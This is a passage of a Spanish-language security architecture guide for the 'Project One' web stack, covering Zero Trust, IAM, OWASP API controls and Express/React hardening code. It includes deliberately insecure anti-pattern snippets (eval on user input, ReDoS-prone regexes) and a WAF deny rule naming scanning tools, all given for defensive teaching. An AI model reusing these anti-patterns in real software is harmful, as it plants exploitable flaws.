    subgraph SHORT["SHORT (3-12 meses)"]
        S1[MFA obligatorio (TOTP/WebAuthn)]
        S2[Device Trust: MDM/EDR integration]
        S3[mTLS service-to-service (Envoy sidecar)]
        S4[RASP (Datadog ASM / Contrast)]
        S5[Falco/eBPF runtime monitoring]
        S6[ABAC/RLS PostgreSQL para multi-tenancy]
        S7[Data classification + column encryption]
        S8[ZTNA (Tailscale / Cloudflare Access) para admin]
    end
    
    subgraph MEDIUM["MEDIUM (12-24 meses)"]
        M1[Continuous authentication (risk-based)]
        M2[Passwordless (Passkeys/WebAuthn)]
        M3[Auto-remediation device posture]
        M4[SLSA L3 + artifact attestation verificación obligatoria]
        M5[Data-centric security (DLP, tokenization)]
        M6[Self-healing workloads (Kyverno policies)]
    end
    
    subgraph LONG["LONG (24+ meses)"]
        L1[Zero Trust Network Access nativo]
        L2[Full encryption everywhere (in-use via TEEs)]
        L3[AI-driven threat detection/response]
        L4[Automated compliance evidence]
    end
    
    NOW --> SHORT --> MEDIUM --> LONG
    
    style NOW fill:#bbf7d0,stroke:#16a34a
    style SHORT fill:#fef08a,stroke:#ca8a04
    style MEDIUM fill:#ffcccc,stroke:#dc2626
    style LONG fill:#e9d5ff,stroke:#a855f7
```

### 7.4 Diagrama Zero Trust Reference Architecture

```mermaid
graph TB
    subgraph USERS["👥 Identidades"]
        EMP[Empleados]
        DEV[Desarrolladores]
        ADMIN[Administradores]
        SVC[Service Accounts\nWorkload Identity]
        EXT[Partners / APIs Externas]
    end
    
    subgraph IDP["🔐 Identity Provider\n(Auth0 / Azure AD / Keycloak)"]
        MFA[MFA Adaptativo\nTOTP + WebAuthn + Push]
        JIT[Just-in-Time Access\nElevación temporal]
        COND[Conditional Access\nDevice + Location + Risk]
        SCIM[SCIM Provisioning\nLifecycle automatizado]
    end
    
    subgraph ZTNA["🌐 Zero Trust Network Access"]
        ZTNA_GW[ZTNA Gateway\nTailscale / Cloudflare Access / AWS Verified Access]
        DEVICE[Device Trust\nMDM + EDR + Attestation]
        MICRO[Micro-segmentación\nIdentity-based policies]
    end
    
    subgraph WORKLOADS["⚙️ Workloads (AWS ECS Fargate)"]
        subgraph API["API Layer"]
            GW[API Gateway\nALB + WAF]
            SVC1[Auth Service\nJWT + mTLS]
            SVC2[Business Services\nRBAC + ABAC]
            SVC3[Admin Service\nBreak-glass + Audit]
        end
        
        subgraph DATA["Data Layer"]
            RDS[(RDS PostgreSQL\nEncrypted + IAM Auth + RLS)]
            REDIS[(ElastiCache Redis\nEncrypted + ACLs)]
            S3[(S3\nEncrypted + Object Lock)]
        end
        
        subgraph INFRA["Infra & Observability"]
            VAULT[Secrets Manager\nAWS KMS + Vault]
            MON[Monitoring\nPrometheus + Grafana + Falco]
            SIEM[SIEM/SOAR\nDatadog / Splunk]
        end
    end
    
    subgraph POLICY["📋 Policy Engine"]
        OPA[OPA / Kyverno\nAdmission + Runtime]
        CEDAR[Cedar / Verified Permissions\nFine-grained authZ]
    end
    
    USERS --> IDP
    IDP -->|OIDC + MFA + JIT| ZTNA
    ZTNA -->|Verified Identity + Healthy Device| WORKLOADS
    
    GW --> SVC1
    GW --> SVC2
    GW --> SVC3
    
    SVC1 -.->|mTLS| SVC2
    SVC2 -.->|mTLS| RDS
    SVC2 -.->|mTLS| REDIS
    
    SVC1 --> VAULT
    SVC2 --> VAULT
    SVC3 --> VAULT
    
    SVC1 --> POLICY
    SVC2 --> POLICY
    SVC3 --> POLICY
    
    POLICY -->|Decisions| SVC1
    POLICY -->|Decisions| SVC2
    POLICY -->|Decisions| SVC3
    
    MON --> SIEM
    VAULT --> SIEM
    ZTNA --> SIEM
    IDP --> SIEM
    
    style IDP fill:#a5f3fc,stroke:#0891b2
    style ZTNA fill:#bbf7d0,stroke:#16a34a
    style WORKLOADS fill:#fef08a,stroke:#ca8a04
    style POLICY fill:#e9d5ff,stroke:#a855f7
    style VAULT fill:#ffcccc,stroke:#dc2626
```

---

## 8. IAM Enterprise

### 8.1 Autenticación Multifactor (MFA)

| Factor | Tipo | Implementación | Estado Project One |
|--------|------|----------------|-------------------|
| **Something you know** | Password/PIN | bcrypt cost ≥ 12 | ✅ Implementado |
| **Something you have** | TOTP (Authenticator), WebAuthn (Passkeys), Push | **Gap** — no implementado | ❌ Crítico |
| **Something you are** | Biometría (platform authenticator) | WebAuthn level 2/3 | ❌ Gap |
| **Somewhere you are** | Geolocation, IP reputation | Conditional access policies | ❌ Gap |

**Requisito Enterprise**: MFA obligatorio para **todos** accesos:
- Admin console: WebAuthn (FIDO2) + TOTP fallback
- Developer access (GitHub, AWS): GitHub MFA + AWS MFA
- CI/CD pipelines: OIDC federation (no secrets), **no MFA aplicable**
- End users: TOTP minimum, WebAuthn preferred

### 8.2 Single Sign-On (SSO) y Federación

| Protocolo | Uso | Configuración Enterprise |
|-----------|-----|--------------------------|
| **SAML 2.0** | Enterprise IdP (Azure AD, Okta, Ping) | SP-initiated + IdP-initiated, signed assertions, encryption |
| **OIDC** | Modern apps, CI/CD, developer tools | PKCE obligatorio, `nonce`, `state`, short-lived tokens |
| **OAuth 2.0** | API authorization, third-party integrations | Authorization Code + PKCE, refresh token rotation, scopes granulares |
| **SCIM 2.0** | Provisioning/deprovisioning automático usuarios/grupos | IdP → App (Just-in-Time + scheduled sync) |

**Arquitectura SSO Project One**:
```
┌─────────────┐     SAML/OIDC      ┌──────────────────┐
│  IdP Corp   │◄──────────────────►│   Project One    │
│ (Azure AD,  │   Federation       │   (Auth Service) │
│  Okta, etc) │                    │                  │
└─────────────┘                    └────────┬─────────┘
                                            │
                    ┌───────────────────────┼───────────────────────┐
                    ▼                       ▼                       ▼
            ┌───────────────┐       ┌───────────────┐       ┌───────────────┐
            │   Frontend    │       │   Backend     │       │   CI/CD       │
            │   (React)     │       │   (Express)   │       │   (GH Actions)│
            │   OIDC PKCE   │       │   JWT RS256   │       │   OIDC Fed    │
            └───────────────┘       └───────────────┘       └───────────────┘
```

### 8.3 OAuth 2.0 + PKCE (Proof Key for Code Exchange)

**Por qué PKCE obligatorio**: Previene authorization code interception attacks (public clients, SPAs).

```javascript
// Flujo PKCE - Cliente React (apps/client/src/auth/oauth.ts)
import { generateCodeVerifier, generateCodeChallenge } from 'pkce-challenge';

async function initiateOAuthFlow(providerConfig) {
  const codeVerifier = generateCodeVerifier(128); // 43-128 chars, URL-safe
  const codeChallenge = generateCodeChallenge(codeVerifier, 'S256');
  
  // Guardar codeVerifier en sessionStorage (no localStorage)
  sessionStorage.setItem('pkce_verifier', codeVerifier);
  
  const authUrl = new URL(providerConfig.authorizationEndpoint);
  authUrl.searchParams.set('response_type', 'code');
  authUrl.searchParams.set('client_id', providerConfig.clientId);
  authUrl.searchParams.set('redirect_uri', providerConfig.redirectUri);
  authUrl.searchParams.set('scope', 'openid profile email offline_access');
  authUrl.searchParams.set('code_challenge', codeChallenge);
  authUrl.searchParams.set('code_challenge_method', 'S256');
  authUrl.searchParams.set('state', crypto.randomUUID()); // CSRF protection
  
  window.location.href = authUrl.toString();
}

async function handleCallback(code, state) {
  const codeVerifier = sessionStorage.getItem('pkce_verifier');
  if (!codeVerifier) throw new Error('PKCE verifier missing');
  
  const tokenResponse = await fetch(tokenEndpoint, {
    method: 'POST',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: new URLSearchParams({
      grant_type: 'authorization_code',
      code,
      redirect_uri: redirectUri,
      client_id: clientId,
      code_verifier: codeVerifier, // PKCE proof
    }),
  });
  
  sessionStorage.removeItem('pkce_verifier');
  return tokenResponse.json();
}
```

### 8.4 Least Privilege, JIT Access, Secret Rotation

| Principio | Implementación | Herramientas |
|-----------|----------------|--------------|
| **Least Privilege** | RBAC granular (permissions matrix), ABAC futuro, no wildcard policies | Custom middleware `verifyRole`, `checkPermission` |
| **JIT Access** | Elevación temporal con aprobación, auto-expiración, audit trail | AWS IAM Access Analyzer, PIM (Privileged Identity Management), **gap: herramienta dedicada** |
| **Secret Rotation** | Rotación automática cada 30-90 días, versionado, rollback capability | AWS Secrets Manager rotation lambdas, Vault dynamic secrets, **GitHub Actions OIDC (no rotation needed)** |

**JWT Algorithm Selection**:

| Algoritmo | Uso | Ventajas | Desventajas | Recomendación Project One |
|-----------|-----|----------|-------------|---------------------------|
| **HS256** | Symmetric, shared secret | Simple, fast | Key distribution problem, no non-repudiation | **Solo dev/local**; **prohibido en prod** |
| **RS256** | Asymmetric, RSA 2048+ | Public key verification, key rotation independent | Larger tokens, slower verification | **Producción obligatorio** |
| **ES256** | Asymmetric, ECDSA P-256 | Smaller tokens, faster than RSA | Complex key management | Alternativa válida |
| **EdDSA (Ed25519)** | Asymmetric, Ed25519 | Smallest tokens, fastest, strong security | Newer, less library support | **Preferido para nuevos sistemas** |

**Configuración Project One**:
```javascript
// utils/jwt/createToken.js - Configuración enterprise
const JWT_CONFIG = {
  // Access Token
  accessToken: {
    algorithm: process.env.NODE_ENV === 'production' ? 'RS256' : 'HS256',
    expiresIn: '15m',
    issuer: 'project-one',
    audience: 'project-one-api',
    keyId: process.env.JWT_KEY_ID, // Key rotation support
  },
  
  // Refresh Token
  refreshToken: {
    algorithm: 'RS256', // Siempre asymmetric
    expiresIn: '24h', // Considerar reducir a 4-8h
    issuer: 'project-one',
    audience: 'project-one-refresh',
    rotation: true, // Rotación en cada uso
    reuseDetection: true, // Detectar replay
  },
  
  // Key Management
  keys: {
    // RS256/ES256/EdDSA: claves en AWS KMS / Vault
    // HS256: solo dev, rotación manual cada 90 días
    rotationIntervalDays: 30,
    gracePeriodDays: 7, // Overlap para validación
  },
};
```

---

## 9. Seguridad APIs — OWASP API Top 10 2023

### 9.1 Mapeo API Top 10 2023 → Controles Project One

| # | API Top 10 2023 | Descripción | Control Project One | Gap |
|---|-----------------|-------------|---------------------|-----|
| **API1** | **BOLA** (Broken Object Level Authorization) | Acceso no autorizado a objetos via ID manipulation | RBAC middleware + ownership checks en controllers | ⚠️ Tests automatizados BOLA faltantes |
| **API2** | Broken Authentication | Credenciales débiles, token management flaws | JWT RS256, short-lived, refresh rotation, rate limiting | ❌ MFA, account lockout progresivo |
| **API3** | Broken Object Property Level Authorization | Mass assignment, excessive data exposure | Joi `allowUnknown: false`, DTOs estrictos, field-level permissions | ⚠️ Field-level authZ (ABAC) faltante |
| **API4** | Unrestricted Resource Consumption | DoS via resource exhaustion (CPU, memory, storage) | Rate limiting multi-capa, timeouts, payload limits | ⚠️ Adaptive rate limiting, quota per user |
| **API5** | Broken Function Level Authorization | Acceso a funciones admin sin rol | RBAC middleware `verifyRole`, route guards | ✅ Implementado |
| **API6** | Unrestricted Access to Sensitive Business Flows | Abuso flujos negocio (password reset, purchase) | Rate limiting específico, business logic validation | ⚠️ Anomaly detection en flujos críticos |
| **API7** | Server Side Request Forgery (SSRF) | Server hace requests a destinos controlados por attacker | Validación estricta URLs, allowlist destinos, no user-supplied URLs | ✅ Implementado |
| **API8** | Security Misconfiguration | Config insegura (headers, CORS, error details) | Helmet, strict CORS, error handling controlado | ⚠️ Config drift detection |
| **API9** | Improper Inventory Management | APIs shadow, versiones deprecated, docs outdated | OpenAPI/Swagger docs, versioning en URL, deprecation policy | ⚠️ API catalog automatizado |
| **API10** | **Unsafe Consumption of APIs** (NUEVO 2023) | Consumo inseguro APIs terceros (no validación, trust ciego) | **Gap crítico** — validación respuesta, circuit breaker, timeout | ❌ No implementado |

### 9.2 Rate Limiting, Quotas, WAF, Schema Validation, Idempotency

#### Rate Limiting Multi-Capa (Implementado + Enterprise)

```javascript
// middleware/rateLimit.enterprise.js
import rateLimit from 'express-rate-limit';
import RedisStore from 'rate-limit-redis';
import { createClient } from 'redis';

const redisClient = createClient({ url: process.env.REDIS_URL });
await redisClient.connect();

// 1. Global API Rate Limit
export const globalLimiter = rateLimit({
  store: new RedisStore({ sendCommand: (...args) => redisClient.sendCommand(args) }),
  windowMs: 15 * 60 * 1000, // 15 minutos
  max: 1000, // 1000 requests/ventana por IP
  message: { error: 'Too many requests, please try again later' },
  standardHeaders: true,
  legacyHeaders: false,
  keyGenerator: (req) => req.ip, // o user ID si autenticado
  skip: (req) => req.path === '/health', // Health checks sin límite
});

// 2. Auth Endpoints - Stricter
export const authLimiter = rateLimit({
  store: new RedisStore({ sendCommand: (...args) => redisClient.sendCommand(args) }),
  windowMs: 15 * 60 * 1000,
  max: 10, // 10 attempts/15min
  message: { error: 'Too many authentication attempts' },
  keyGenerator: (req) => `auth:${req.ip}`,
  skipSuccessfulRequests: false, // Contar exitosos también
});

// 3. Sensitive Operations - Per User Quota
export const sensitiveOpLimiter = rateLimit({
  store: new RedisStore({ sendCommand: (...args) => redisClient.sendCommand(args) }),
  windowMs: 60 * 60 * 1000, // 1 hora
  max: 50, // 50 ops/hora por usuario
  keyGenerator: (req) => `sensitive:${req.user?.id || req.ip}`,
  handler: (req, res) => {
    res.status(429).json({ 
      error: 'Quota exceeded', 
      retryAfter: res.getHeader('Retry-After') 
    });
  },
});

// 4. Adaptive Rate Limiting (Enterprise) - Basado en riesgo
export const adaptiveLimiter = (req, res, next) => {
  const riskScore = calculateRiskScore(req); // ML/reglas: geo, device, behavior, reputation
  const limits = {
    low: { windowMs: 15*60*1000, max: 1000 },
    medium: { windowMs: 15*60*1000, max: 200 },
    high: { windowMs: 15*60*1000, max: 20 },
    critical: { windowMs: 15*60*1000, max: 5 },
  };
  const config = limits[riskScore] || limits.medium;
  return rateLimit({ ...config, store: new RedisStore({...}) })(req, res, next);
};
```

#### WAF Rules (AWS WAF / CloudFlare)

```yaml
# .github/waf-rules.yaml (para terraform/iac)
rules:
  # OWASP Top 10 Managed Rule Group
  - name: AWSManagedRulesKnownBadInputsRuleSet
    priority: 10
    override_action: count # start in count mode
    
  - name: AWSManagedRulesSQLiRuleSet
    priority: 20
    override_action: block
    
  - name: AWSManagedRulesAnonymousIpList
    priority: 30
    override_action: block
    
  # Custom Rules Project One
  - name: BlockKnownBadBots
    priority: 5
    statement:
      byte_match_statement:
        search_string: "sqlmap|nikto|nmap|dirb|gobuster"
        field_to_match: { single_header: { name: "user-agent" } }
        text_transformations:
          - priority: 0, type: "LOWERCASE"
    action: { block: {} }
    
  - name: RateLimitPerUser
    priority: 15
    statement:
      rate_based_statement:
        limit: 1000
        aggregate_key_type: "FORWARDED_IP"
        scope_down_statement:
          byte_match_statement:
            search_string: "/api/"
            field_to_match: { uri_path: {} }
    action: { block: {} }
    visibility_config:
      sampled_requests_enabled: true
      cloud_watch_metrics_enabled: true
      metric_name: "RateLimitPerUser"
```

#### Schema Validation (Request/Response)

```javascript
// middleware/validateSchema.enterprise.js
import Joi from 'joi';
import { ValidationError } from '../utils/errors.js';

// Registry centralizado de esquemas
export const schemas = {
  // Auth
  login: Joi.object({
    email: Joi.string().email().max(254).required(),
    password: Joi.string().min(8).max(128).required(),
    mfaCode: Joi.string().length(6).pattern(/^\d+$/).optional(), // TOTP
    rememberMe: Joi.boolean().optional(),
  }).options({ allowUnknown: false, stripUnknown: true }),
  
  register: Joi.object({
    email: Joi.string().email().max(254).required(),
    password: Joi.string().min(12).max(128)
      .pattern(/^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@$!%*?&])/)
      .required()
      .messages({
        'string.pattern.base': 'Password must contain uppercase, lowercase, number, special char',
      }),
    firstName: Joi.string().max(50).pattern(/^[a-zA-ZÀ-ÿ\s'-]+$/).required(),
    lastName: Joi.string().max(50).pattern(/^[a-zA-ZÀ-ÿ\s'-]+$/).required(),
  }).options({ allowUnknown: false, stripUnknown: true }),
  
  // API Resources - Example
  createProduct: Joi.object({
    name: Joi.string().max(100).min(1).required(),
    description: Joi.string().max(5000).allow('').optional(),
    price: Joi.number().positive().precision(2).required(),
    categoryId: Joi.string().uuid().required(),
    tags: Joi.array().items(Joi.string().max(50)).max(10).optional(),
    metadata: Joi.object().pattern(Joi.string(), Joi.alternatives().types(['string', 'number', 'boolean'])).optional(),
  }).options({ allowUnknown: false, stripUnknown: true }),
  
  // Pagination (reusable)
  pagination: Joi.object({
    page: Joi.number().integer().min(1).default(1),
    limit: Joi.number().integer().min(1).max(100).default(20),
    sortBy: Joi.string().max(50).optional(),
    sortOrder: Joi.string().valid('asc', 'desc').default('asc'),
  }).options({ allowUnknown: false, stripUnknown: true }),
};

// Middleware factory
export const validate = (schemaName, source = 'body') => (req, res, next) => {
  const schema = schemas[schemaName];
  if (!schema) {
    return next(new Error(`Schema '${schemaName}' not found`));
  }
  
  const data = req[source];
  const { error, value } = schema.validate(data, { 
    abortEarly: false,
    convert: true, // Coerción segura (string "123" → number 123)
  });
  
  if (error) {
    const details = error.details.map(d => ({
      field: d.path.join('.'),
      message: d.message.replace(/['"]/g, ''),
    }));
    return next(new ValidationError('Validation failed', details));
  }
  
  req[source] = value; // Datos sanitizados y validados
  next();
};

// Response validation (contract testing)
export const validateResponse = (schemaName) => (req, res, next) => {
  const originalJson = res.json.bind(res);
  res.json = (data) => {
    if (process.env.NODE_ENV !== 'production') {
      const schema = schemas[`${schemaName}Response`];
      if (schema) {
        const { error } = schema.validate(data);
        if (error) {
          console.error(`Response validation failed for ${schemaName}:`, error.details);
          // En producción: alertar, no bloquear
        }
      }
    }
    return originalJson(data);
  };
  next();
};
```

#### Idempotency Keys (Para Operaciones Críticas)

```javascript
// middleware/idempotency.js
import { Redis } from 'ioredis';

const redis = new Redis(process.env.REDIS_URL);
const IDEMPOTENCY_TTL = 24 * 60 * 60; // 24 horas

export const idempotencyMiddleware = (req, res, next) => {
  // Solo para métodos no-idempotentes por defecto
  if (!['POST', 'PATCH', 'PUT', 'DELETE'].includes(req.method)) {
    return next();
  }
  
  const idempotencyKey = req.headers['idempotency-key'];
  if (!idempotencyKey) {
    return res.status(400).json({ 
      error: 'Idempotency-Key header required for this operation' 
    });
  }
  
  // Validar formato (UUID v4)
  if (!/^[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/i.test(idempotencyKey)) {
    return res.status(400).json({ error: 'Invalid Idempotency-Key format (UUID v4 required)' });
  }
  
  const key = `idempotency:${req.user?.id || req.ip}:${idempotencyKey}`;
  
  // Verificar si ya procesado
  redis.get(key).then((cached) => {
    if (cached) {
      const { statusCode, body, headers } = JSON.parse(cached);
      Object.entries(headers).forEach(([k, v]) => res.set(k, v));
      return res.status(statusCode).json(body);
    }
    
    // Capturar respuesta
    const originalJson = res.json.bind(res);
    res.json = (body) => {
      const responseData = {
        statusCode: res.statusCode,
        body,
        headers: res.getHeaders(),
      };
      redis.setex(key, IDEMPOTENCY_TTL, JSON.stringify(responseData));
      return originalJson(body);
    };
    
    next();
  }).catch(next);
};
```

---

## 10. Seguridad Node.js/Express

### 10.1 Event Loop y Seguridad

| Riesgo | Descripción | Mitigación |
|--------|-------------|------------|
| **Event Loop Blocking** | Operaciones CPU-intensivas bloquean loop → DoS | Worker threads para crypto, image processing, PDF generation; `setImmediate` para yield |
| **Async Context Propagation** | Loss de contexto en async hooks → logging/tracing roto | `async_hooks` + `cls-rtracer` para request IDs |
| **Unhandled Rejections** | Promesas rechazadas sin catch → crash silencioso | `process.on('unhandledRejection', ...)` + logging + graceful shutdown |

### 10.2 Prototype Pollution

```javascript
// Prevención - middleware/prototypePollution.js
export const preventPrototypePollution = (req, res, next) => {
  // Sanitizar req.body, req.query, req.params
  const sanitize = (obj) => {
    if (obj && typeof obj === 'object') {
      Object.keys(obj).forEach(key => {
        if (key === '__proto__' || key === 'constructor' || key === 'prototype') {
          delete obj[key];
        } else if (typeof obj[key] === 'object') {
          sanitize(obj[key]);
        }
      });
    }
  };
  
  sanitize(req.body);
  sanitize(req.query);
  sanitize(req.params);
  next();
};

// Librería recomendada: 'proto-safe' o 'object.freeze' deep
import { freeze } from 'proto-safe';
app.use((req, res, next) => {
  freeze(req.body);
  freeze(req.query);
  freeze(req.params);
  next();
});
```

### 10.3 Deserialization Insegura

```javascript
// NUNCA usar eval, Function constructor, o deserialize untrusted data
// ❌ MAL
eval(userInput);
new Function(userInput)();
JSON.parse(userInput, (k, v) => { if (typeof v === 'string' && v.startsWith('function')) return eval(v); return v; });

// ✅ BIEN - Solo JSON.parse nativo, validación estricta
const data = JSON.parse(req.body); // Con Content-Type: application/json
// Validar con Joi inmediatamente después
```

### 10.4 ReDoS (Regular Expression Denial of Service)

```javascript
// Evitar regex vulnerables
// ❌ VULNERABLE: catastrofic backtracking
const vulnerable = /^(a+)+$/;
const vulnerable2 = /^(a|aa)*$/;

// ✅ SEGURO: regex linear, anchored, sin nested quantifiers
const safeEmail = /^[a-zA-Z0-9.!#$%&'*+/=?^_`{|}~-]+@[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(?:\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*$/;

// Herramienta: 'safe-regex' o 'redos-detector' en CI
// npm install -g safe-regex && safe-regex package.json
```

### 10.5 Dependency Confusion & Supply Chain

| Vector | Descripción | Mitigación Project One |
|--------|-------------|------------------------|
| **Dependency Confusion** | Paquete privado nombre público → npm instala público | `npmrc` con `registry` privado, `publishConfig.access: restricted`, scopes `@project-one/*` |
| **Typosquatting** | Paquete similar nombre (lodash → lodash.js) | `npm audit`, `Socket.dev` / `Snyk` advisories, lockfile strict |
| **Malicious Maintainer** | Mantenedor legítimo compremetido publica versión maliciosa | Pin exact versions, `npm ci`, SLSA provenance verification, `npm audit signatures` |
| **Compromised Build** | CI/CD comprometido inyecta código | SLSA L3, signed artifacts, reproducible builds, hermetic builds |

**Configuración npm Enterprise**:
```ini
# .npmrc (proyecto)
registry=https://registry.npmjs.org/
@project-one:registry=https://npm.pkg.github.com/
@scope:registry=https://private-registry.example.com/

# Seguridad
audit-level=high
fund=false
audit=true
strict-ssl=true
prefer-offline=false
ignore-scripts=true # Prevent lifecycle scripts execution

# Lockfile
package-lock=true
save-exact=true
legacy-peer-deps=false
```

### 10.6 Helmet, CSP, Cookies, CORS Estricto

```javascript
// utils/helmet/helmet.config.enterprise.js
import helmet from 'helmet';
import rateLimit from 'express-rate-limit';

export const helmetConfig = {
  // Content Security Policy
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", "'wasm-unsafe-eval'"], // wasm-unsafe-eval para Vite dev
      scriptSrcElem: ["'self'"],
      scriptSrcAttr: ["'none'"],
      styleSrc: ["'self'", "'unsafe-inline'"], // unsafe-inline para Tailwind JIT en dev
      styleSrcElem: ["'self'"],
      styleSrcAttr: ["'unsafe-inline'"],
      imgSrc: ["'self'", 'data:', 'blob:'],
      fontSrc: ["'self'", 'data:'],
      connectSrc: ["'self'", process.env.VITE_WS_URL?.replace('wss://', 'https://') || ''],
      mediaSrc: ["'self'"],
      objectSrc: ["'none'"],
      frameSrc: ["'none'"],
      frameAncestors: ["'none'"],
      baseUri: ["'self'"],
      formAction: ["'self'"],
      manifestSrc: ["'self'"],
      workerSrc: ["'self'", 'blob:'],
      childSrc: ["'self'"],
      upgradeInsecureRequests: process.env.NODE_ENV === 'production' ? [] : null,
      blockAllMixedContent: process.env.NODE_ENV === 'production' ? [] : null,
      // Reporting
      reportUri: process.env.NODE_ENV === 'production' ? '/api/csp-report' : null,
      reportTo: process.env.NODE_ENV === 'production' ? 'csp-endpoint' : null,
    },
    reportOnly: process.env.NODE_ENV !== 'production', // Enforce solo en prod
  },
  
  // HTTP Strict Transport Security
  hsts: {
    maxAge: 31536000, // 1 año
    includeSubDomains: true,
    preload: true, // Submit to hstspreload.org
  },
  
  // X-Frame-Options
  frameguard: { action: 'deny' },
  
  // X-Content-Type-Options
  noSniff: true,
  
  // Referrer Policy
  referrerPolicy: { policy: 'strict-origin-when-cross-origin' },
  
  // Permissions Policy (Feature Policy)
  permissionsPolicy: {
    features: {
      accelerometer: ["'none'"],
      camera: ["'none'"],
      geolocation: ["'none'"],
      gyroscope: ["'none'"],
      magnetometer: ["'none'"],
      microphone: ["'none'"],
      payment: ["'self'"],
      usb: ["'none'"],
      'xr-spatial-tracking': ["'none'"],
    },
  },
  
  // Cross-Origin policies
  crossOriginEmbedderPolicy: false, // Requiere COEP/COOP configuración cuidadosa
  crossOriginOpenerPolicy: { policy: 'same-origin' },
  crossOriginResourcePolicy: { policy: 'same-site' },
  
  // DNS Prefetch Control
  dnsPrefetchControl: { allow: false },
  
  // Expect-CT (Certificate Transparency)
  expectCt: {
    maxAge: 86400,
    enforce: true,
    reportUri: '/api/expect-ct-report',
  },
  
  // Hide X-Powered-By
  hidePoweredBy: true,
  
  // IE No Open (legacy)
  ieNoOpen: true,
};

// CORS Estricto - app.js
import cors from 'cors';

const corsOptions = {
  origin: (origin, callback) => {
    const allowedOrigins = [
      'https://app.project-one.com',
      'https://admin.project-one.com',
      process.env.VITE_APP_URL, // Vercel preview URLs
    ].filter(Boolean);
    
    // Permitir requests sin origin (mobile apps, curl, etc.) solo si no credentials
    if (!origin) return callback(null, true);
    
    if (allowedOrigins.includes(origin)) {
      callback(null, true);
    } else {
      callback(new Error('Not allowed by CORS'));
    }
  },
  credentials: true, // Cookies + Authorization header
  methods: ['GET', 'POST', 'PUT', 'PATCH', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization', 'X-CSRF-Token', 'Idempotency-Key'],
  exposedHeaders: ['Retry-After', 'X-RateLimit-Limit', 'X-RateLimit-Remaining', 'X-RateLimit-Reset'],
  maxAge: 86400, // 24 horas preflight cache
  optionsSuccessStatus: 204,
};

app.use(cors(corsOptions));
app.use(helmet(helmetConfig));
```

### 10.7 Cookies Seguras

```javascript
// Configuración cookies enterprise
const cookieOptions = {
  // Access Token Cookie (si se usa cookie-based)
  accessToken: {
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production',
    sameSite: 'strict', // CSRF protection nativo
    maxAge: 15 * 60 * 1000, // 15 min
    path: '/api',
    domain: process.env.COOKIE_DOMAIN, // '.project-one.com' para subdominios
    partitioned: true, // CHIPS - partitioned cookies (Chrome 114+)
  },
  
  // Refresh Token Cookie
  refreshToken: {
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production',
    sameSite: 'strict',
    maxAge: 24 * 60 * 60 * 1000, // 24h (considerar 4-8h)
    path: '/api/auth/refresh',
    domain: process.env.COOKIE_DOMAIN,
    partitioned: true,
  },
  
  // CSRF Token Cookie (double-submit pattern)
  csrfToken: {
    httpOnly: false, // JavaScript necesita leerlo
    secure: process.env.NODE_ENV === 'production',
    sameSite: 'strict',
    maxAge: 24 * 60 * 60 * 1000,
    path: '/',
    domain: process.env.COOKIE_DOMAIN,
    // NOT partitioned - needs to be readable by JS
  },
};
```

---

## 11. Seguridad React/Frontend

### 11.1 XSS Prevention

| Vector | Mitigación | Implementación Project One |
|--------|------------|----------------------------|
| **Reflected/Stored XSS** | Output encoding, CSP, Trusted Types | React auto-escape JSX, CSP strict, Trusted Types (proyectado) |
| **DOM-based XSS** | Evitar `dangerouslySetInnerHTML`, sanitizar | ESLint rule `react/no-danger`, DOMPurify para contenido rico |
| **JSONP/Callback XSS** | No usar JSONP, validar callbacks | No implementado |
| **PostMessage XSS** | Validar origin, structured data | Ver sección 11.5 |

**Trusted Types (Enterprise)**:
```typescript
// apps/client/src/security/trustedTypes.ts
// Requiere: <meta http-equiv="Content-Security-Policy" content="trusted-types reactPolicy;">

if (window.trustedTypes && trustedTypes.createPolicy) {
  const policy = trustedTypes.createPolicy('reactPolicy', {
    createHTML: (string: string) => DOMPurify.sanitize(string, { RETURN_TRUSTED_TYPE: true }),
    createScript: (string: string) => string, // Solo para scripts de confianza
    createScriptURL: (url: string) => url,
  });
  
  // Exponer globalmente para React
  (window as any).trustedTypesPolicy = policy;
}

// Uso en componentes que requieren HTML dinámico
import DOMPurify from 'dompurify';

function RichContent({ html }: { html: string }) {
  const sanitized = DOMPurify.sanitize(html, {
    ALLOWED_TAGS: ['p', 'br', 'strong', 'em', 'u', 'ol', 'ul', 'li', 'a', 'h1', 'h2', 'h3'],
    ALLOWED_ATTR: ['href', 'target', 'rel'],
  });
  
  return <div dangerouslySetInnerHTML={{ __html: sanitized }} />;
}
```

### 11.2 Content Security Policy (CSP) Frontend

```html
<!-- index.html - CSP meta tag para desarrollo -->
<meta http-equiv="Content-Security-Policy" 
  content="
    default-src 'self';
    script-src 'self' 'wasm-unsafe-eval' https://cdn.jsdelivr.net;
    script-src-elem 'self' https://cdn.jsdelivr.net;
    script-src-attr 'none';
    style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
    style-src-elem 'self' 'unsafe-inline' https://fonts.googleapis.com;
    style-src-attr 'unsafe-inline';
    img-src 'self' data: blob: https://*.project-one.com;
    font-src 'self' data: https://fonts.gstatic.com;
    connect-src 'self' wss://api.project-one.com https://api.project-one.com;
    media-src 'self';
    object-src 'none';
    frame-src 'none';
    frame-ancestors 'none';
    base-uri 'self';
    form-action 'self';
    manifest-src 'self';
    worker-src 'self' blob:;
    child-src 'self';
    upgrade-insecure-requests;
    block-all-mixed-content;
    report-uri /api/csp-report;
  ">
```

### 11.3 CSRF en SPAs

| Patrón | Descripción | Project One |
|--------|-------------|-------------|
| **Double-Submit Cookie** | Cookie accesible JS + header personalizado | ✅ Implementado (`csrf-token` header + cookie) |
| **SameSite Cookies** | `SameSite=Strict/Lax` previene envío cross-site | ✅ `Strict` en auth cookies |
| **Custom Headers** | Requerir header que browsers no envían cross-origin | ✅ `X-CSRF-Token` |
| **Origin/Referer Check** | Validar `Origin` y `Referer` headers | ✅ Middleware valida origin |

**Axios Interceptor (apps/client/src/api/axios.ts)**:
```typescript
import axios from 'axios';

const api = axios.create({
  baseURL: import.meta.env.VITE_API_URL,
